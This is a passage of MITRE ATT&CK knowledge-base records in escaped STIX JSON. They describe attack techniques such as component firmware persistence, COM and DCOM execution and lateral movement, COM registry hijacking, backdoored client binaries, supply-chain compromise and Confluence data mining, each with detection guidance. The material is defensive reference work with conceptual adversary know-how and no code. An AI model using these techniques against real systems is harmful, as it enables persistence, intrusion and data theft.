2018.\",\"source_name\":\"Microsoft CVE-2017-8625 Aug 2017\",\"url\":\"https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-8625\"}],\"id\":\"attack-pattern--a6937325-9321-4e2e-bb2b-3ed2d40b2a9d\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-20T22:32:24.589Z\",\"name\":\"Compiled HTML File\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Rahmat Nurfauzi, @infosecn1nja, PT Xynexis International\"],\"x_mitre_data_sources\":[\"Process command-line parameters\",\"Process monitoring\",\"File monitoring\"],\"x_mitre_defense_bypassed\":[\"Digital Certificate Validation\",\"Application control\"],\"x_mitre_detection\":\"Monitor and analyze the execution and arguments of hh.exe. (Citation: MsitPros CHM Aug 2017) Compare recent invocations of hh.exe with prior history of known good arguments to determine anomalous and potentially adversarial activity (ex: obfuscated and/or malicious commands). Non-standard process execution trees may also indicate suspicious or malicious behavior, such as if hh.exe is the parent process for suspicious processes and activity relating to other adversarial techniques.\\n\\nMonitor presence and use of CHM files, especially if they are not typically used within an environment.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:22.374Z\",\"external_references\":[{\"external_id\":\"T1109\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1109\"},{\"description\":\"SanDisk. (n.d.). Self-Monitoring, Analysis and Reporting Technology (S.M.A.R.T.). Retrieved October 2, 2018.\",\"source_name\":\"SanDisk SMART\"},{\"description\":\"smartmontools. (n.d.). smartmontools. Retrieved October 2, 2018.\",\"source_name\":\"SmartMontools\",\"url\":\"https://www.smartmontools.org/\"},{\"description\":\"Pinola, M. (2014, December 14). 3 tools to check your hard drive\'s health and make sure it\'s not already dying on you. Retrieved October 2, 2018.\",\"source_name\":\"ITWorld Hard Disk Health Dec 2014\",\"url\":\"https://www.itworld.com/article/2853992/3-tools-to-check-your-hard-drives-health-and-make-sure-its-not-already-dying-on-you.html\"}],\"id\":\"attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44\",\"modified\":\"2020-07-07T10:46:44.193Z\",\"name\":\"Component Firmware\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2019-12-19T20:21:21.669Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1542/001) but conducted upon other system components/devices that may not have the same capability or level of integrity checking.\\n\\nMalicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.\",\"external_references\":[{\"external_id\":\"T1542.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1542/002\"},{\"description\":\"SanDisk. (n.d.). Self-Monitoring, Analysis and Reporting Technology (S.M.A.R.T.). Retrieved October 2, 2018.\",\"source_name\":\"SanDisk SMART\"},{\"description\":\"smartmontools. (n.d.). smartmontools. Retrieved October 2, 2018.\",\"source_name\":\"SmartMontools\",\"url\":\"https://www.smartmontools.org/\"},{\"description\":\"Pinola, M. (2014, December 14). 3 tools to check your hard drive\'s health and make sure it\'s not already dying on you. Retrieved October 2, 2018.\",\"source_name\":\"ITWorld Hard Disk Health Dec 2014\",\"url\":\"https://www.itworld.com/article/2853992/3-tools-to-check-your-hard-drives-health-and-make-sure-its-not-already-dying-on-you.html\"}],\"id\":\"attack-pattern--791481f8-e96a-41be-b089-a088763083d4\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-23T23:48:33.904Z\",\"name\":\"Component Firmware\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Component firmware\",\"Process monitoring\",\"Disk forensics\",\"API monitoring\"],\"x_mitre_defense_bypassed\":[\"Anti-virus\",\"Host intrusion prevention systems\",\"File monitoring\"],\"x_mitre_detection\":\"Data and telemetry from use of device drivers (i.e. processes and API calls) and/or provided by SMART (Self-Monitoring, Analysis and Reporting Technology) (Citation: SanDisk SMART) (Citation: SmartMontools) disk monitoring may reveal malicious manipulations of components. Otherwise, this technique may be difficult to detect since malicious activity is taking place on system components possibly outside the purview of OS security and integrity mechanisms.\\n\\nDisk check and forensic utilities (Citation: ITWorld Hard Disk Health Dec 2014) may reveal indicators of malicious firmware such as strings, unexpected disk partition table entries, or blocks of otherwise unusual memory that warrant deeper investigation. Also consider comparing components, including hashes of component firmware and behavior, against known good images.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"SYSTEM\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_system_requirements\":[\"Ability to update component device firmware from the host operating system.\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-12T14:09:53.107Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.(Citation: Fireeye Hunting COM June 2019) Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE).(Citation: Microsoft COM)\\n\\nVarious COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).(Citation: Microsoft COM) Specific COM objects also exist to directly perform functions beyond code execution, such as creating a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.(Citation: Fireeye Hunting COM June 2019)(Citation: ProjectZero File Write EoP Apr 2018)\",\"external_references\":[{\"external_id\":\"T1559.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1559/001\"},{\"description\":\"Hamilton, C. (2019, June 4). Hunting COM Objects. Retrieved June 10, 2019.\",\"source_name\":\"Fireeye Hunting COM June 2019\",\"url\":\"https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html\"},{\"description\":\"Microsoft. (n.d.). Component Object Model (COM). Retrieved November 22, 2017.\",\"source_name\":\"Microsoft COM\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/ms680573.aspx\"},{\"description\":\"Forshaw, J. (2018, April 18). Windows Exploitation Tricks: Exploiting Arbitrary File Writes for Local Elevation of Privilege. Retrieved May 3, 2018.\",\"source_name\":\"ProjectZero File Write EoP Apr 2018\",\"url\":\"https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html\"},{\"description\":\"Nelson, M. (2017, November 16). Lateral Movement using Outlook\'s CreateObject Method and DotNetToJScript. Retrieved November 21, 2017.\",\"source_name\":\"Enigma Outlook DCOM Lateral Movement Nov 2017\",\"url\":\"https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/\"},{\"description\":\"Nelson, M. (2017, January 5). Lateral Movement using the MMC20 Application COM Object. Retrieved November 21, 2017.\",\"source_name\":\"Enigma MMC20 COM Jan 2017\",\"url\":\"https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/\"}],\"id\":\"attack-pattern--2f6b4ed7-fef1-44ba-bcb8-1b4beb610b64\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"execution\"}],\"modified\":\"2020-03-28T19:30:52.639Z\",\"name\":\"Component Object Model\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"DLL monitoring\"],\"x_mitre_detection\":\"Monitor for COM objects loading DLLs and other modules not typically associated with the application.(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) Enumeration of COM objects, via [Query Registry](https://attack.mitre.org/techniques/T1012) or [PowerShell](https://attack.mitre.org/techniques/T1059/001), may also proceed malicious use.(Citation: Fireeye Hunting COM June 2019)(Citation: Enigma MMC20 COM Jan 2017)\\n\\nMonitor for spawning of processes associated with COM objects, especially those invoked by a user different than the one currently logged on. \",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:33.979Z\",\"external_references\":[{\"external_id\":\"T1122\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1122\"},{\"description\":\"Microsoft. (n.d.). The Component Object Model. Retrieved August 18, 2016.\",\"source_name\":\"Microsoft Component Object Model\",\"url\":\"https://msdn.microsoft.com/library/ms694363.aspx\"},{\"description\":\"G DATA. (2014, October). COM Object hijacking: the discreet way of persistence. Retrieved August 13, 2016.\",\"source_name\":\"GDATA COM Hijacking\",\"url\":\"https://blog.gdatasoftware.com/2014/10/23941-com-object-hijacking-the-discreet-way-of-persistence\"},{\"description\":\"Ewing, P. Strom, B. (2016, September 15). How to Hunt: Detecting Persistence & Evasion with the COM. Retrieved September 15, 2016.\",\"source_name\":\"Endgame COM Hijacking\",\"url\":\"https://www.elastic.co/blog/how-hunt-detecting-persistence-evasion-com\"}],\"id\":\"attack-pattern--9b52fca7-1a36-4da0-b62d-da5bd83b4d69\",\"modified\":\"2020-03-20T16:01:20.868Z\",\"name\":\"Component Object Model Hijacking\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-03-16T14:12:47.923Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.(Citation: Microsoft Component Object Model)  References to various COM objects are stored in the Registry. \\n\\nAdversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary\'s code will be executed instead.(Citation: GDATA COM Hijacking) An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection. \",\"external_references\":[{\"external_id\":\"T1546.015\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1546/015\"},{\"description\":\"Microsoft. (n.d.). The Component Object Model. Retrieved August 18, 2016.\",\"source_name\":\"Microsoft Component Object Model\",\"url\":\"https://msdn.microsoft.com/library/ms694363.aspx\"},{\"description\":\"G DATA. (2014, October). COM Object hijacking: the discreet way of persistence. Retrieved August 13, 2016.\",\"source_name\":\"GDATA COM Hijacking\",\"url\":\"https://blog.gdatasoftware.com/2014/10/23941-com-object-hijacking-the-discreet-way-of-persistence\"},{\"description\":\"Ewing, P. Strom, B. (2016, September 15). How to Hunt: Detecting Persistence & Evasion with the COM. Retrieved September 15, 2016.\",\"source_name\":\"Endgame COM Hijacking\",\"url\":\"https://www.elastic.co/blog/how-hunt-detecting-persistence-evasion-com\"}],\"id\":\"attack-pattern--bc0f5e80-91c0-4e04-9fbb-e4e332c85dae\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-03-16T14:19:22.457Z\",\"name\":\"Component Object Model Hijacking\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"ENDGAME\"],\"x_mitre_data_sources\":[\"Process command-line parameters\",\"Process monitoring\",\"Loaded DLLs\",\"DLL monitoring\",\"Windows Registry\"],\"x_mitre_detection\":\"There are opportunities to detect COM hijacking by searching for Registry references that have been replaced and through Registry operations (ex: [Reg](https://attack.mitre.org/software/S0075)) replacing known binary paths with unknown paths or otherwise malicious content. Even though some third-party applications define user COM objects, the presence of objects within HKEY_CURRENT_USER\\\\Software\\\\Classes\\\\CLSID\\\\ may be anomalous and should be investigated since user objects will be loaded prior to machine objects in HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Classes\\\\CLSID\\\\.(Citation: Endgame COM Hijacking) Registry entries for existing COM objects may change infrequently. When an entry with a known good path and binary is replaced or changed to an unusual value to point to an unknown binary in a new location, then it may indicate suspicious behavior and should be investigated.  \\n\\nLikewise, if software DLL loads are collected and analyzed, any unusual DLL load that can be correlated with a COM object Registry modification may indicate COM hijacking has been performed. \",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2018-01-16T16:13:52.465Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"**This technique has been deprecated. Please use [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) and [Component Object Model](https://attack.mitre.org/techniques/T1559/001).**\\n\\nAdversaries may use the Windows Component Object Model (COM) and Distributed Component Object Model (DCOM) for local code execution or to execute on remote systems as part of lateral movement. \\n\\nCOM is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.(Citation: Fireeye Hunting COM June 2019) Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE).(Citation: Microsoft COM) DCOM is transparent middleware that extends the functionality of Component Object Model (COM) (Citation: Microsoft COM) beyond a local computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting COM June 2019)\\n\\nPermissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry. (Citation: Microsoft COM ACL)(Citation: Microsoft Process Wide Com Keys)(Citation: Microsoft System Wide Com Keys) By default, only Administrators may remotely activate and launch COM objects through DCOM.\\n\\nAdversaries may abuse COM for local command and/or payload execution. Various COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and VBScript.(Citation: Microsoft COM) Specific COM objects also exists to directly perform functions beyond code execution, such as creating a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), fileless download/execution, and other adversary behaviors such as Privilege Escalation and Persistence.(Citation: Fireeye Hunting COM June 2019)(Citation: ProjectZero File Write EoP Apr 2018)\\n\\nAdversaries may use DCOM for lateral movement. Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications (Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) as well as other Windows objects that contain insecure methods.(Citation: Enigma MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can also execute macros in existing documents (Citation: Enigma Excel DCOM Sept 2017) and may also invoke [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1173) (DDE) execution directly through a COM created instance of a Microsoft Office application (Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing the need for a malicious document.\",\"external_references\":[{\"external_id\":\"T1175\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1175\"},{\"description\":\"Hamilton, C. (2019, June 4). Hunting COM Objects. Retrieved June 10, 2019.\",\"source_name\":\"Fireeye Hunting COM June 2019\",\"url\":\"https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html\"},{\"description\":\"Microsoft. (n.d.). Component Object Model (COM). Retrieved November 22, 2017.\",\"source_name\":\"Microsoft COM\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/ms680573.aspx\"},{\"description\":\"Microsoft. (n.d.). DCOM Security Enhancements in Windows XP Service Pack 2 and Windows Server 2003 Service Pack 1. Retrieved November 22, 2017.\",\"source_name\":\"Microsoft COM ACL\",\"url\":\"https://docs.microsoft.com/en-us/windows/desktop/com/dcom-security-enhancements-in-windows-xp-service-pack-2-and-windows-server-2003-service-pack-1\"},{\"description\":\"Microsoft. (n.d.). Setting Process-Wide Security Through the Registry. Retrieved November 21, 2017.\",\"source_name\":\"Microsoft Process Wide Com Keys\",\"url\":\"https://msdn.microsoft.com/en-us/library/windows/desktop/ms687317(v=vs.85).aspx\"},{\"description\":\"Microsoft. (n.d.). Registry Values for System-Wide Security. Retrieved November 21, 2017.\",\"source_name\":\"Microsoft System Wide Com Keys\",\"url\":\"https://msdn.microsoft.com/en-us/library/windows/desktop/ms694331(v=vs.85).aspx\"},{\"description\":\"Forshaw, J. (2018, April 18). Windows Exploitation Tricks: Exploiting Arbitrary File Writes for Local Elevation of Privilege. Retrieved May 3, 2018.\",\"source_name\":\"ProjectZero File Write EoP Apr 2018\",\"url\":\"https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html\"},{\"description\":\"Nelson, M. (2017, November 16). Lateral Movement using Outlook\'s CreateObject Method and DotNetToJScript. Retrieved November 21, 2017.\",\"source_name\":\"Enigma Outlook DCOM Lateral Movement Nov 2017\",\"url\":\"https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/\"},{\"description\":\"Nelson, M. (2017, January 5). Lateral Movement using the MMC20 Application COM Object. Retrieved November 21, 2017.\",\"source_name\":\"Enigma MMC20 COM Jan 2017\",\"url\":\"https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/\"},{\"description\":\"Nelson, M. (2017, January 23). Lateral Movement via DCOM: Round 2. Retrieved November 21, 2017.\",\"source_name\":\"Enigma DCOM Lateral Movement Jan 2017\",\"url\":\"https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/\"},{\"description\":\"Nelson, M. (2017, September 11). Lateral Movement using Excel.Application and DCOM. Retrieved November 21, 2017.\",\"source_name\":\"Enigma Excel DCOM Sept 2017\",\"url\":\"https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/\"},{\"description\":\"Tsukerman, P. (2017, November 8). Leveraging Excel DDE for lateral movement via DCOM. Retrieved November 21, 2017.\",\"source_name\":\"Cyberreason DCOM DDE Lateral Movement Nov 2017\",\"url\":\"https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom\"}],\"id\":\"attack-pattern--772bc7a8-a157-42cc-8728-d648e25c7fe7\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"lateral-movement\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"execution\"}],\"modified\":\"2020-03-30T13:36:10.069Z\",\"name\":\"Component Object Model and Distributed COM\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"revoked\":false,\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"PowerShell logs\",\"API monitoring\",\"Authentication logs\",\"DLL monitoring\",\"Packet capture\",\"Process monitoring\",\"Windows Registry\",\"Windows event logs\"],\"x_mitre_deprecated\":true,\"x_mitre_detection\":\"Monitor for COM objects loading DLLs and other modules not typically associated with the application.(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) Enumeration of COM objects, via [Query Registry](https://attack.mitre.org/techniques/T1012) or [PowerShell](https://attack.mitre.org/techniques/T1086), may also proceed malicious use.(Citation: Fireeye Hunting COM June 2019)(Citation: Enigma MMC20 COM Jan 2017)\\n\\nMonitor for spawning of processes associated with COM objects, especially those invoked by a user different than the one currently logged on.\\n\\nMonitor for any influxes or abnormal increases in Distributed Computing Environment/Remote Procedure Call (DCE/RPC) traffic.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"Administrator\",\"SYSTEM\",\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_remote_support\":true,\"x_mitre_version\":\"2.0\"}",
    "{\"created\":\"2020-02-11T18:18:34.279Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may modify client software binaries to establish persistent access to systems. Client software enables users to access services provided by a server. Common client software types are SSH clients, FTP clients, email clients, and web browsers.\\n\\nAdversaries may make modifications to client software binaries to carry out malicious tasks when those applications are in use. For example, an adversary may copy source code for the client software, add a backdoor, compile for the target, and replace the legitimate application binary (or support files) with the backdoored one. Since these applications may be routinely executed by the user, the adversary can leverage this for persistent access to the host.\",\"external_references\":[{\"external_id\":\"T1554\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1554\"}],\"id\":\"attack-pattern--960c3c86-1480-4d72-b4e0-8c242e84a5c5\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-03-27T14:49:58.249Z\",\"name\":\"Compromise Client Software Binary\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"CrowdStrike Falcon OverWatch\"],\"x_mitre_data_sources\":[\"Process monitoring\",\"Binary file metadata\"],\"x_mitre_detection\":\"Collect and analyze signing certificate metadata and check signature validity on software that executes within the environment. Look for changes to client software that do not correlate with known software or patch cycles. \\n\\nConsider monitoring for anomalous behavior from client applications, such as atypical module loads, file reads/writes, or network connections.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-11T14:28:40.064Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system. Hardware backdoors may be inserted into various devices, such as servers, workstations, network infrastructure, or peripherals.\",\"external_references\":[{\"external_id\":\"T1195.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1195/003\"}],\"id\":\"attack-pattern--39131305-9282-45e4-ac3b-591d2d4fc3ef\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"initial-access\"}],\"modified\":\"2020-03-23T12:51:45.475Z\",\"name\":\"Compromise Hardware Supply Chain\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Component firmware\",\"BIOS\",\"Disk forensics\",\"EFI\"],\"x_mitre_detection\":\"Perform physical inspection of hardware to look for potential tampering. Perform integrity checking on pre-OS boot mechanisms that can be manipulated for malicious purposes.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-11T14:13:42.916Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency. (Citation: Trendmicro NPM Compromise)  \\n\\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. \",\"external_references\":[{\"external_id\":\"T1195.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1195/001\"},{\"description\":\"Trendmicro. (2018, November 29). Hacker Infects Node.js Package to Steal from Bitcoin Wallets. Retrieved April 10, 2019.\",\"source_name\":\"Trendmicro NPM Compromise\",\"url\":\"https://www.trendmicro.com/vinfo/dk/security/news/cybercrime-and-digital-threats/hacker-infects-node-js-package-to-steal-from-bitcoin-wallets\"}],\"id\":\"attack-pattern--191cc6af-1bb2-4344-ab5f-28e496638720\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"initial-access\"}],\"modified\":\"2020-03-11T14:13:42.916Z\",\"name\":\"Compromise Software Dependencies and Development Tools\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\",\"Web proxy\"],\"x_mitre_detection\":\"Use verification of distributed binaries through hash checking or other integrity checking mechanisms. Scan downloads for malicious signatures and attempt to test software and updates prior to deployment while taking note of potential suspicious activity. \",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-11T14:17:21.153Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.\\n\\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Avast CCleaner3 2018) (Citation: Command Five SK 2011)  \",\"external_references\":[{\"external_id\":\"T1195.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1195/002\"},{\"description\":\"Avast Threat Intelligence Team. (2018, March 8). New investigations into the CCleaner incident point to a possible third stage that had keylogger capacities. Retrieved March 15, 2018.\",\"source_name\":\"Avast CCleaner3 2018\",\"url\":\"https://blog.avast.com/new-investigations-in-ccleaner-incident-point-to-a-possible-third-stage-that-had-keylogger-capacities\"},{\"description\":\"Command Five Pty Ltd. (2011, September). SK Hack by an Advanced Persistent Threat. Retrieved April 6, 2018.\",\"source_name\":\"Command Five SK 2011\",\"url\":\"https://www.commandfive.com/papers/C5_APT_SKHack.pdf\"}],\"id\":\"attack-pattern--bd369cd9-abb8-41ce-b5bb-fff23ee86c00\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"initial-access\"}],\"modified\":\"2020-03-11T14:17:21.153Z\",\"name\":\"Compromise Software Supply Chain\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\",\"Web proxy\"],\"x_mitre_detection\":\"Use verification of distributed binaries through hash checking or other integrity checking mechanisms. Scan downloads for malicious signatures and attempt to test software and updates prior to deployment while taking note of potential suspicious activity. \",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-14T13:09:51.004Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"\\nAdversaries may leverage Confluence repositories to mine valuable information. Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation, however, in general may contain more diverse categories of useful information, such as:\\n\\n* Policies, procedures, and standards\\n* Physical / logical network diagrams\\n* System architecture diagrams\\n* Technical system documentation\\n* Testing / development credentials\\n* Work / project schedules\\n* Source code snippets\\n* Links to network shares and other internal resources\\n\",\"external_references\":[{\"external_id\":\"T1213.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1213/001\"},{\"description\":\"Atlassian. (2018, January 9). How to Enable User Access Logging. Retrieved April 4, 2018.\",\"source_name\":\"Atlassian Confluence Logging\",\"url\":\"https://confluence.atlassian.com/confkb/how-to-enable-user-access-logging-182943.html\"}],\"id\":\"attack-pattern--7ad38ef1-381a-406d-872a-38b136eb5ecc\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"collection\"}],\"modified\":\"2020-03-24T16:42:09.222Z\",\"name\":\"Confluence\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Third-party application logs\",\"Authentication logs\"],\"x_mitre_detection\":\"Monitor access to Confluence repositories performed by privileged users (for example, Active Directory Domain, Enterprise, or Schema Administrators) as these types of accounts should not generally used to access information repositories. If the capability exists, it may be of value to monitor and alert on users that are retrieving and viewing a large number of documents and pages; this behavior may be indicative of programmatic means being used to retrieve all data within the repository. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user based anomalies.\\n\\nUser access logging within Atlassian\'s Confluence can be configured to report access to certain pages and documents through AccessLogFilter. (Citation: Atlassian Confluence Logging) Additional log storage and analysis infrastructure will likely be required for more robust detection capabilities.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"SaaS\"],\"x_mitre_version\":\"1.0\"}",
